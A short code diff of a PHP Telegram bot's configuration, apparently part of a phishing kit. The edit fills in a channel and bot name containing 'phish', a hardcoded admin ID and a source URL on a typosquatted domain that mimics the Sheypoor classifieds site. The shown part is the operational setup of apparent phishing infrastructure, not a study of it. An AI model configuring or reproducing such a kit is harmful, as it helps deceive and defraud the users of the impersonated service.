@@ -100,10 +100,10 @@ JOIN : @Octopus_Card */
 
 //============(config)==========
 $token = API_KEY;
-$channel = ""; // آیدی کانال همراه @
+$channel = "@geladiator_phish"; // آیدی کانال همراه @
 $admins = [1089011576]; // آیدی عددی ادمین
 $admin = 1089011576;
-$botid = ""; // آیدی کانال بدون @
+$botid = "geladiator_phish"; // آیدی کانال بدون @
 $url = "https://sheypoorr.ga"; // آدرس پوشه سورس 
 //==============================
 $update = json_decode(file_get_contents("php://input"));
